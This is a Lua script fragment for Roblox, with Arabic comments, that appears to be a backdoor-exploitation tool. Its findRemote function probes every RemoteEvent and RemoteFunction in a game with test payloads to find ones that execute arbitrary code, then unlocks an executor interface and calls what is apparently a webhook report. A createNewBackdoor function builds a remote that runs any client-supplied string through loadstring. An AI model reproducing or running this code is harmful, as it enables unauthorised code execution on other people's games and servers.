local function createNewBackdoor()
    local newRemote = Instance.new("RemoteEvent")
    newRemote.Name = "Backdoor_" .. generateName(10)
    newRemote.Parent = ReplicatedStorage
    
    newRemote.OnServerEvent:Connect(function(player, scriptToExecute)
        if scriptToExecute and type(scriptToExecute) == "string" then
            local success, error = pcall(function()
                loadstring(scriptToExecute)()
            end)
            if not success then
                warn("Error executing script: " .. error)
            end
        end
    end)
    
    return newRemote
end

-- وظيفة حذف الأبواب الخلفية
local function removeBackdoors()
    local count = 0
    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") and string.find(obj.Name, "Backdoor_") then
            obj:Destroy()
            count = count + 1
        end
    end
    return count
end

local function findRemote()
    local remotes = {}
    updateStatus("Starting Scan...", Color3.fromRGB(255, 255, 0))
    
    -- البحث عن الأبواب الخلفية الموجودة
    local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
    
    if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
        local code = generateName(math.random(12,30))
        local payload = "l=Instance.new(\"Model\",workspace) l.Name='" .. code .. "'"
        task.spawn(function()
            protected_backdoor:InvokeServer('nil', payload) 
        end)
        remotes[code] = protected_backdoor
    end

    for i,remote in game:GetDescendants() do
        if not remote:IsA('RemoteEvent') and not remote:IsA('RemoteFunction') then continue end
        if string.split(remote:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then continue end
        
        if remote.Parent == ReplicatedStorage or remote.Parent.Parent == ReplicatedStorage or remote.Parent.Parent.Parent == ReplicatedStorage then
            if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then continue end
            if remote.Parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then continue end
            if remote.Parent.Name=='DefaultChatSystemChatEvents' then continue end
        end
        
        local code = generateName(math.random(12,30))
        local payload = "l=Instance.new(\"Model\",workspace) l.Name='" .. code .. "'"
        runRemote(remote, payload)
        remotes[code] = remote
    end
    
    for i = 1, 100 do
        updateStatus("Scanning... "..i.."%", Color3.fromRGB(255, 255, 0))
        for code,remote in remotes do
            if workspace:FindFirstChild(code) then
                backdoor = remote
                Execy.Visible = true
                Cody.Visible = true
                CLR.Visible = true
                r6.Visible = true
                re.Visible = true
                g.Visible = true
                Acqur.Visible = false
                updateStatus("inject succeed!", Color3.fromRGB(0, 255, 0))
                SendEmbed()
                return true
            end
        end
        task.wait(0.05)
    end
    
    -- إذا لم يتم العثور على باب خلفي، قم بإنشاء واحد جديد
    updateStatus("No backdoor found, creating new one...", Color3.fromRGB(255, 255, 0))
    backdoor = createNewBackdoor()
    
    if backdoor then
        Execy.Visible = true
        Cody.Visible = true
        CLR.Visible = true
        r6.Visible = true
        re.Visible = true
        g.Visible = true
        Acqur.Visible = false
        updateStatus("New backdoor created!", Color3.fromRGB(0, 255, 0))
        SendEmbed()
        return true
    else
        updateStatus("Sorry you can't", Color3.fromRGB(255, 0, 0))
        g.Position = UDim2.new(0, 100, 0, 193) 
        g.Visible = true
        Cody.Visible = true
        Acqur.Visible = false
        return false
    end
end

